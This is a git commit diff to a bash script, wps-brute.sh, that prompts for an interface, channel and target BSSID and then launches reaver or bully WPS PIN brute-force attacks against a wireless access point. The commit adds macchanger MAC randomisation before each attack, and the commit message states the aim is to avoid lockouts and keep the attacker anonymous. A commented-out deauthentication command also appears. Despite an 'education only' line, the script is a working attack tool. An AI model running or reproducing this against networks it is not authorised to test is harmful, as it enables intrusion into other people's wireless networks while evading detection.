25cf294edabeb5374fe74516bf69ece25216791a
Diveyez <nemofbaltimore@gmail.com>
2018-02-12 09:35:28 -0500

    +MacChanger to avoid lockouts, anonymity retention
    Changes:
    ifconfig $interface down
             macchanger -r $interface
             ifconfig $interface up

--- wps-brute.sh
+++ wps-brute.sh
@@ -3,17 +3,15 @@
 # Education useage only!
 # This has caused a failure in the Randomized WPS system
 # Further testing required
-# ......
+# Written by Diveyez to make using other tools easy when setting up wireless networks.
 # Intended for use with stock kali-linux packages
-# apt update && apt install reaver bully airmon-ng aireplay-ng
+# apt update && apt install reaver bully airmon-ng aireplay-ng macchanger pixiewps
 # Scripting user input for target, channel, interface
-#echo "You need an adapter in monitor mode to use this, Just incase we are gonna do that for you!"
-#sleep 1.5
-#iwconfig
+echo "You need an adapter in monitor mode to use this, airmon-ng start <interface> if you have not done that already!"
+sleep 1.5
 echo "What interface do we use?:"
 read interface
 echo "Using:" $interface;
-#airmon-ng start $interface
 echo "What channel is target on?:"
 read channel
 echo "Using Channel:" $channel;
@@ -31,10 +29,16 @@ do
     case $opt in
         "Reaver")
             echo "Reaver Attack Launching"
+          ifconfig $interface down
+          macchanger -r $interface
+          ifconfig $interface up
           #aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1
           reaver -i $interface -b $tmac -c $channel -vv -K -JSL -p "";;
         "Bully")
             echo "Bully Attack Launching"
+         ifconfig $interface down
+         macchanger -r $interface
+         ifconfig $interface up
          #aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1
          bully $interface -b $tmac -e $bname -c$channel -dB -v 3 -p "" ;;
         "Quit")
@@ -46,4 +50,3 @@ do
 echo "If that didnt work, Well, We tried!"
 echo "If this failed, you may have used incorrect information, or the AP is not vulernable (WPS)"
 done
-
